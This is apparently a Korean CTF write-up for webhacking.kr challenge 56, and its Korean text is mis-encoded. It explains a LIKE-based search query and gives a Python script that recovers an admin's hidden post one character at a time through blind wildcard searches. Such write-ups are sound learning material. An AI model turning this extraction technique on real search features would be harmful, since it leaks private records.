---
title: "[webhacking.kr] 56ë²ˆ ë¬¸ì œ í’€ì´[sql injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "56ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 56ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/154011710-004a04fa-a91b-4a03-aed0-fe6d53a459a5.png)

  search ê¸°ëŠ¥ì„ ì´ìš©í•´ì„œ adminì˜ ê²Œì‹œê¸€ ë‚´ìš©ì„ ì•Œì•„ë‚´ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.


# ë¬¸ì œ í’€ì´
  ê²Œì‹œê¸€ ì°¾ê¸° ê¸°ëŠ¥ì„ ì‚¬ìš©í• ë•Œ ì¼ë°˜ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ sql ë¬¸ì„ í†µí•´ì„œ dbì—ì„œ ì°¾ì•„ì˜µë‹ˆë‹¤.

  ```sql
select * from chall56 where secret like '%{search}%'
  ```

  ëª‡ê°€ì§€ ì‹¤í—˜ ê²°ê³¼ ìœ„ì˜ ì¿¼ë¦¬ë¬¸ìœ¼ë¡œ sqlë¬¸ì´ êµ¬ì„±ëœ ê±¸ë¡œ ì¶”ì •ë˜ë©°, ì´ë¥¼ ì´ìš©í•´ì„œ ë‹¤ìŒê³¼ ê°™ì´ íŒŒì´ì¬ ì½”ë“œë¡œ ê²Œì‹œê¸€ì˜ ë‚´ìš©ì„ ì°¾ì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  ë¬¸ì œë¥¼ í’€ ë‹¹ì‹œì—ëŠ” ë§¨ ì²˜ìŒ ë‹¨ì–´ê°€ FLAGì¼ ê²ƒìœ¼ë¡œ ì¶”ì •í•˜ê³  í’€ì–´ì„œ ë¹ ë¥´ê²Œ í’€ì—ˆì§€ë§Œ, ë³´ë‹¤ ì¼ë°˜ì ìœ¼ë¡œ ê²Œì‹œê¸€ ë‚´ìš©ì„ ì¶”ì •í•˜ê¸° ìœ„í•´ì„œ í•˜ë‚˜ì˜ ê¸€ìì—ì„œ ì‹œì‘í•´ì„œ ë’¤ì˜ ë‚´ìš©ì„ ì™„ì„±í•˜ê³ , ë‹¤ì‹œ ì•ì˜ ë‚´ìš©ì„ ì™„ì„±í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ searchingì„ ì§„í–‰í–ˆìŠµë‹ˆë‹¤.

  ê·¸ë¦¬ê³  ì£¼ì˜í•´ì•¼ í•  ì ì€, searchingì„ í• ë•ŒëŠ” '%' ì™€ '_'ì˜ ì‚¬ìš©ì„ ì£¼ì˜í•´ì•¼ í•©ë‹ˆë‹¤.

  '%' : ëª¨ë“  ì„ì˜ì˜ ë¬¸ìì—´ ì˜ë¯¸ 
  '_' : í•˜ë‚˜ì˜ ì„ì˜ì˜ ë¬¸ìì—´ ì˜ë¯¸

  ì´ë•Œ, ê°ê°ì˜ ê¸€ìê°€ ì‹¤ì œ íŠ¹ìˆ˜ë¬¸ìì˜ ê¸°ëŠ¥ì´ ì•„ë‹Œ í•˜ë‚˜ì˜ ê¸€ìë¡œ ë™ì‘í•˜ëŠ” ê²½ìš°ê°€ ìˆê¸° ë•Œë¬¸ì— searchingì˜ ë§¨ ë§ˆì§€ë§‰ì—ëŠ” '_'ê°€ ì¡´ì¬í•˜ëŠ”ì§€ë„ í™•ì¸í•´ ì¤ë‹ˆë‹¤.

```python
import requests
import string

url = 'https://webhacking.kr/challenge/web-33/'
TRUE_FLAG = 'admin'
secret = 'a'
data = {}
exit = 0


# '%' ëŠ” ì‚­ì œí•˜ê³ , '_'ëŠ” ë§¨ ë§ˆì§€ë§‰ì— ì¶”ê°€
printable_string = string.printable
printable_string = printable_string.replace('%','')
printable_string = printable_string.replace('_','')
printable_string = printable_string + '_'
    

# aë¶€í„° ë’·ê¸€ìë“¤ì„ ë¨¼ì € ë§ì¶˜ë‹¤.
while exit==0:
    for character in printable_string:
        data['search'] = secret + character
        response = requests.post(url,data=data)
        if(TRUE_FLAG in response.text):
            secret = data['search']
            print('\r[+]',secret,end='')
            break
        if(character == printable_string[-1]):
            exit=1
            print("break while loop")


# ì•ë¶€ë¶„ì„ ì±„ì›Œ ë„£ê¸°
exit = 0
while exit==0:
    for character in printable_string:
        data['search'] = character + secret
        response = requests.post(url,data=data)
        if(TRUE_FLAG in response.text):
            secret = data['search']
            print('\r[+]',secret,end='')
            break    

        if(character == printable_string[-1]):
            exit=1
            print("break while loop")
            print(secret)
```

ì½”ë“œ ì‹¤í–‰ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë‚˜ì™”ìœ¼ë©°, ë§¨ ì•ì˜ \ëŠ” ì œê±°í•´ ì¤ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/154013180-fee784f3-eca3-4852-aaae-c0d5f2c23140.png)

